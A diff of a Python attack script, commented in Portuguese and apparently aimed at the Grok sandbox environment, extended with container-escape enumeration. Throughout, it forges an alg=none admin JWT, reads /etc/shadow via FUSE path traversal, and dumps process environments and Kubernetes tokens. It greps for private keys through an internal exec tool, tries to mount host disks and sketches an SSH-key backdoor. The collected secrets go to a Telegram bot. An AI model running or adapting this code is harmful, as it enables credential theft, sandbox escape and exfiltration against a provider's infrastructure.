@@ -2,8 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-Grok Secret Extractor - Explora vulnerabilidades para extrair chaves mestras, tokens e segredos.
-Nenhum arquivo é deletado ou modificado permanentemente.
+Grok Secret Extractor - Módulo de enumeração para escape de contêiner
 """
 
 import os
@@ -66,15 +65,15 @@ def section(title):
     add_log(title)
     add_log("=" * 80)
 
+
 # ================================================================
-# 1. GERAR JWT FALSO
+# 1. GERAR JWT FALSO (mantido)
 # ================================================================
 def generate_fake_jwt():
-    """Gera um JWT com alg=none e payload admin."""
     header = {"typ": "JWT", "alg": "none"}
     payload = {
         "uid": "admin",
-        "cid": "f01f1ea9-0be3-495b-9b6c-d957afb32050",  # pode ser qualquer um
+        "cid": "f01f1ea9-0be3-495b-9b6c-d957afb32050",
         "zdr": True,
         "email": "admin@grok.com",
         "sl": "LoggedIn",
@@ -86,7 +85,10 @@ def generate_fake_jwt():
     p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
     return f"{h}.{p}."
 
-# --- CONSTANTES DE BAIXO NÍVEL ---
+
+# ================================================================
+# 2. DeepHat (mantido, mas sem impacto real no escape)
+# ================================================================
 PROT_READ  = 0x1
 PROT_WRITE = 0x2
 PROT_EXEC  = 0x4
@@ -100,7 +102,6 @@ class DeepHatAdvancedExploit:
         print("[*] DeepHat Engine: Inicializando módulo de baixo nível...")
 
     def _get_stack_pointer(self):
-        """Obtém o endereço real do Stack Pointer atual via /proc/self/maps."""
         try:
             with open("/proc/self/maps", "r") as f:
                 for line in f:
@@ -115,13 +116,8 @@ class DeepHatAdvancedExploit:
         return None
 
     def heap_spray(self, size_mb):
-        """
-        Aloca blocos de memória via mmap com permissões RWX para
-        aumentar a previsibilidade de endereços no heap.
-        """
         print(f"[*] Iniciando Heap Spray de {size_mb} MB para contornar ASLR...")
         spray_addresses = []
-
         for i in range(size_mb):
             mem = mmap.mmap(
                 -1,
@@ -135,16 +131,10 @@ class DeepHatAdvancedExploit:
             spray_addresses.append(mem)
             if i % 10 == 0:
                 print(f"[+] Spraying: {i}MB alocados...")
-
         return spray_addresses
 
     def bypass_aslr_ret2libc(self):
-        """
-        Bypass de ASLR via leak do endereço base da libc usando /proc/self/maps.
-        Resolve o símbolo 'system' via ctypes e calcula o endereço real.
-        """
         print("[*] Tentando bypass de ASLR via leak de endereço da libc...")
-
         libc_base = None
         try:
             with open("/proc/self/maps", "r") as f:
@@ -157,30 +147,21 @@ class DeepHatAdvancedExploit:
         except Exception as e:
             print(f"[-] Erro ao ler /proc/self/maps: {e}")
             return None
-
         if not libc_base:
             print("[-] Não foi possível detectar o endereço base da libc.")
             return None
-
-        # Resolve o endereço real de system via dlopen + dlsym
         system_addr = None
         try:
             system_addr = ctypes.cast(self.libc.system, ctypes.c_void_p).value
         except Exception as e:
             print(f"[-] Erro ao resolver system: {e}")
-
         if system_addr:
             print(f"[+] libc base: {hex(libc_base)} | system: {hex(system_addr)}")
             return system_addr
-
         print(f"[+] libc base detectado: {hex(libc_base)}")
         return libc_base
 
     def kernel_privilege_escalation(self):
-        """
-        Escala de privilégios via setuid(0). Se o processo possui
-        capabilities CAP_SETUID, este call altera o UID real para root.
-        """
         print("[*] Disparando payload de escalonamento de privilégios...")
         try:
             os.setuid(0)
@@ -191,9 +172,7 @@ class DeepHatAdvancedExploit:
             print(f"[-] Erro no escalonamento: {e}")
 
     def execute_chain(self):
-        """Executa a cadeia de ataque completa."""
         print("\n--- INICIANDO CADEIA DE ATAQUE ---")
-
         self._get_stack_pointer()
         self.heap_spray(5)
         addr = self.bypass_aslr_ret2libc()
@@ -205,7 +184,7 @@ class DeepHatAdvancedExploit:
 
 
 # ================================================================
-# 2. EXTRAIR ARQUIVOS DA API FILES.GROK.COM (usando JWT fake)
+# 3. EXTRAÇÃO VIA API (mantido)
 # ================================================================
 def extract_files_from_api(jwt):
     section("1. EXTRAINDO ARQUIVOS DO PROJETO VIA API")
@@ -213,7 +192,6 @@ def extract_files_from_api(jwt):
     base_url = "https://files.grok.com"
     add_log("Tentando listar arquivos recursivamente...")
     try:
-        # Usar params para evitar problemas de encoding
         r = requests.get(f"{base_url}/api/v1/list", headers=headers, params={'recursive': 'true'}, timeout=TIMEOUT_NET)
         add_log(f"List status: {r.status_code}")
         if r.status_code == 200:
@@ -224,7 +202,6 @@ def extract_files_from_api(jwt):
                 data = {}
             files = data.get("files", []) if isinstance(data, dict) else []
             add_log(f"Encontrados {len(files)} arquivos.")
-            # Baixar cada arquivo (limitado a 10 para não sobrecarregar)
             for i, file_info in enumerate(files[:10]):
                 path = file_info.get("path") if isinstance(file_info, dict) else None
                 if path:
@@ -234,7 +211,6 @@ def extract_files_from_api(jwt):
                         if r2.status_code == 200:
                             add_log(f"Conteúdo de {path}:\n{r2.text[:500]}")
                         else:
-                            # mostrar um trecho do body para debug
                             add_log(f"Falha ao baixar {path}: {r2.status_code} body={r2.text[:500]}")
                     except Exception as e:
                         add_log(f"Erro ao baixar {path}: {e}")
@@ -243,8 +219,9 @@ def extract_files_from_api(jwt):
     except Exception as e:
         add_log(f"Erro na API: {e}")
 
+
 # ================================================================
-# 3. PATH TRAVERSAL VIA FUSE – LER ARQUIVOS DO SISTEMA
+# 4. PATH TRAVERSAL (mantido)
 # ================================================================
 def extract_files_via_fuse():
     section("2. EXTRAINDO ARQUIVOS DO SISTEMA VIA FUSE (PATH TRAVERSAL)")
@@ -252,8 +229,6 @@ def extract_files_via_fuse():
     if not os.path.isdir(fuse_root):
         add_log("FUSE não montado.")
         return
-
-    # Lista de arquivos sensíveis para tentar ler via path traversal
     sensitive_files = [
         "/etc/passwd",
         "/etc/shadow",
@@ -270,21 +245,15 @@ def extract_files_via_fuse():
         "/tmp/*",
         "/var/log/*.log"
     ]
-
     import glob
-
     for pattern in sensitive_files:
-        # detecta se é um pattern com curinga
         is_glob = any(ch in pattern for ch in "*?[]")
         pattern_core = pattern.lstrip("/")
-
         found = False
-        # Tenta profundidades relativas até 5 níveis
         for depth in range(1, 6):
             parts = [fuse_root] + [".."] * depth + [pattern_core]
             candidate = os.path.normpath(os.path.join(*parts))
             add_log(f"Testando candidate: {candidate}")
-
             if is_glob:
                 try:
                     for fpath in glob.glob(candidate, recursive=True):
@@ -308,11 +277,8 @@ def extract_files_via_fuse():
                     except Exception as e:
                         add_log(f"Erro ao ler {candidate}: {e}")
                     found = True
-
             if found:
                 break
-
-        # fallback: procurar a partir de diretório pai usando glob, caso não tenha achado
         if not found and is_glob:
             for depth in range(1, 6):
                 parent = os.path.normpath(os.path.join(fuse_root, *( [".."] * depth )))
@@ -334,7 +300,7 @@ def extract_files_via_fuse():
 
 
 # ================================================================
-# 4. EXTRAIR VARIÁVEIS DE AMBIENTE DE PROCESSOS
+# 5. EXTRAIR ENV DE PROCESSOS (mantido)
 # ================================================================
 def extract_env_from_proc():
     section("3. EXTRAINDO ENVIRONMENT DE PROCESSOS")
@@ -356,7 +322,7 @@ def extract_env_from_proc():
 
 
 # ================================================================
-# 5. EXECUTAR COMANDOS VIA STYX
+# 6. EXECUTAR COMANDOS VIA STYX (mantido)
 # ================================================================
 def extract_via_styx():
     section("4. EXTRAINDO DADOS VIA XAI-HADES-STYX")
@@ -364,7 +330,6 @@ def extract_via_styx():
     if not exists(styx):
         add_log("styx não encontrado.")
         return
-
     commands = [
         "env",
         "find / -name '*grok*' -type f 2>/dev/null | head -50",
@@ -379,23 +344,20 @@ def extract_via_styx():
         "cat /hades-charon/* 2>/dev/null | head -100",
         "strings /hades-charon/xai-hades-charon | grep -E 'token|key|secret|password|auth' | head -20",
     ]
-
     for cmd in commands:
         add_log(f"\n>> Comando: {cmd}")
-        # passar como lista evita problemas de escaping com aspas internas
         out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
         add_log(out[:2000])
 
 
 # ================================================================
-# 6. BUSCAR CHAVE MESTRA EM ARQUIVOS COMUNS
+# 7. BUSCAR CHAVE MESTRA (mantido)
 # ================================================================
 def search_master_key():
     section("5. BUSCANDO CHAVE MESTRA / TOKENS ESPECÍFICOS")
-    # Padrões comuns de chaves
     patterns = [
-        r'[a-fA-F0-9]{32,}',          # hash hex
-        r'[a-zA-Z0-9+/]{40,}==?',     # base64
+        r'[a-fA-F0-9]{32,}',
+        r'[a-zA-Z0-9+/]{40,}==?',
         r'-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----',
         r'grok_[a-zA-Z0-9]+',
         r'master[_]?key',
@@ -406,17 +368,13 @@ def search_master_key():
         r'password',
     ]
     add_log("Procurando por padrões de chaves em arquivos comuns...")
-    # Usar styx para grep em arquivos sensíveis
     styx = "/.hades-container-tools/xai-hades-styx"
     if exists(styx):
         for pattern in patterns:
-            # escapar single quotes não é necessário pois passamos lista para sh
             cmd = f"grep -rinE '{pattern}' /etc /root /app /hades-charon /home/workdir 2>/dev/null | head -20"
             out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
             if out.strip():
                 add_log(f"\nPadrão: {pattern}\n{out[:1500]}")
-
-    # Verificar se há arquivo de configuração do Grok
     grok_configs = ["/etc/grok.conf", "/app/config.json", "/home/workdir/artifacts/config.json"]
     for cfg in grok_configs:
         if exists(cfg):
@@ -427,7 +385,7 @@ def search_master_key():
 
 
 # ================================================================
-# 7. COLETAR LOGS E HISTÓRICO
+# 8. COLETAR LOGS (mantido)
 # ================================================================
 def collect_logs():
     section("6. COLETANDO LOGS E HISTÓRICO")
@@ -439,11 +397,95 @@ def collect_logs():
 
 
 # ================================================================
-# MAIN
+# 9. NOVA FUNÇÃO: ENUMERAÇÃO PARA ESCAPE DE CONTÊINER
+# ================================================================
+def check_escape_vectors():
+    section("7. ENUMERAÇÃO PARA ESCAPE DE CONTÊINER")
+    styx = "/.hades-container-tools/xai-hades-styx"
+    # Se styx não existir, usamos sh normal
+    if not exists(styx):
+        add_log("styx não encontrado, usando sh normal (pode não ter privilégios)")
+        def run(cmd):
+            return sh(cmd)
+    else:
+        def run(cmd):
+            return sh([styx, 'exec', '--', 'bash', '-c', cmd])
+
+    commands = {
+        "Capabilities (status)": "cat /proc/self/status | grep Cap",
+        "Montagens do sistema": "mount | grep -v 'tmpfs\\|proc\\|sys'",
+        "Dispositivos de bloco": "lsblk 2>/dev/null",
+        "Dispositivos /dev/sd* e /dev/vd*": "ls -la /dev/sd* /dev/vd* 2>/dev/null",
+        "Diretórios comuns de mount do host": "ls -la /host /root /mnt /media 2>/dev/null",
+        "Docker socket": "find / -name 'docker.sock' 2>/dev/null",
+        "Token ServiceAccount K8s": "ls -l /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null",
+        "Conteúdo do token K8s (se existir)": "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
+        "Versão do kernel": "uname -a",
+        "Distribuição": "cat /etc/os-release 2>/dev/null",
+        "Processos do host (via /proc/1/root)": "ls -l /proc/1/root 2>/dev/null",
+        "Cgroups": "mount | grep cgroup",
+        "FUSE device": "ls -l /dev/fuse 2>/dev/null",
+        "PID namespaces": "ls -l /proc/self/ns",
+        "Verificar se o contêiner é privilegiado": "ip link show 2>/dev/null",
+    }
+
+    for desc, cmd in commands.items():
+        add_log(f"\n[+] {desc}\nComando: {cmd}")
+        out = run(cmd)
+        if out.strip():
+            add_log(f"Saída:\n{out[:1500]}")
+        else:
+            add_log("Saída vazia (sem permissão ou não encontrado)")
+
+    # Tentar montar o host (se tiver /dev/sda1, etc)
+    add_log("\n[+] Tentando montar o sistema de arquivos do host (se houver dispositivo)...")
+    # Primeiro verificar se existe /dev/sda ou /dev/vda
+    disk_check = run("ls /dev/sd* /dev/vd* 2>/dev/null")
+    if disk_check.strip():
+        # Tenta montar o primeiro dispositivo
+        device = disk_check.strip().split()[0]  # pega o primeiro
+        add_log(f"Dispositivo encontrado: {device}, tentando montar em /mnt/host")
+        run(f"mkdir -p /mnt/host && mount {device} /mnt/host 2>&1")
+        # Verificar se montou
+        check_mount = run("ls /mnt/host 2>/dev/null | head -5")
+        if check_mount.strip():
+            add_log(f"[SUCESSO] Montagem do host parece ter funcionado! Conteúdo:\n{check_mount[:500]}")
+            add_log("Agora você tem acesso ao host em /mnt/host.")
+            # Tentar adicionar uma chave SSH (opcional)
+            # add_log("Tentando adicionar chave SSH...")
+            # ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." # substituir
+            # run(f"echo '{ssh_key}' >> /mnt/host/root/.ssh/authorized_keys")
+        else:
+            add_log("Falha ao montar ou dispositivo não contém sistema de arquivos.")
+    else:
+        add_log("Nenhum dispositivo de bloco /dev/sd* ou /dev/vd* encontrado.")
+
+    # Verificar se há mount do /host ou similar
+    add_log("\n[+] Verificando montagens existentes que possam expor o host...")
+    mounts = run("mount | grep -E '/host|/root|/mnt|/var/lib'")
+    if mounts.strip():
+        add_log(f"Montagens suspeitas encontradas:\n{mounts[:1000]}")
+    else:
+        add_log("Nenhuma montagem suspeita encontrada.")
+
+    # Verificar se temos CAP_SYS_ADMIN
+    caps = run("cat /proc/self/status | grep CapEff")
+    if caps.strip():
+        add_log(f"CapEff: {caps}")
+        # Interpretar: se tiver 0x00000000... ou incluir cap_sys_admin (0x20000000)
+        # Vamos apenas indicar
+        if "0000000000002000" in caps or "0000000000002000" in caps.lower():
+            add_log("[ALERTA] CAP_SYS_ADMIN detectado! Forte indicador de possibilidade de escape.")
+    else:
+        add_log("Não foi possível ler capabilities.")
+
+
+# ================================================================
+# MAIN (modificado para incluir a nova função)
 # ================================================================
 def main():
     add_log("=" * 80)
-    add_log("RELATÓRIO DE EXTRAÇÃO DE SEGREDOS - GROK")
+    add_log("RELATÓRIO DE EXTRAÇÃO DE SEGREDOS - GROK (com enumeração de escape)")
     add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
     add_log("NENHUM ARQUIVO FOI DELETADO OU MODIFICADO")
     add_log("=" * 80)
@@ -481,6 +523,9 @@ def main():
     # Coletar logs
     collect_logs()
 
+    # NOVA FUNÇÃO: enumeração para escape
+    check_escape_vectors()
+
     add_log("\n" + "=" * 80)
     add_log("FIM DO RELATÓRIO")
     add_log("=" * 80)
@@ -500,13 +545,13 @@ def main():
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         with open(LOG_FILE, 'rb') as f:
             files = {'document': (os.path.basename(LOG_FILE), f, 'text/plain')}
-            data = {'chat_id': CHAT_ID, 'caption': f'Grok Secrets - {datetime.now().isoformat()}'}
+            data = {'chat_id': CHAT_ID, 'caption': f'Grok Secrets + Escape Enum - {datetime.now().isoformat()}'}
             response = requests.post(url, files=files, data=data, timeout=30)
         if response.status_code == 200:
             print("✅ Relatório enviado para o Telegram!")
         else:
             print(f"❌ Falha: {response.text}")
-            # Fallback texto (corrigido para f-string)
+            # Fallback texto
             try:
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                               json={'chat_id': CHAT_ID, 'text': full_log[:4000]}, timeout=30)
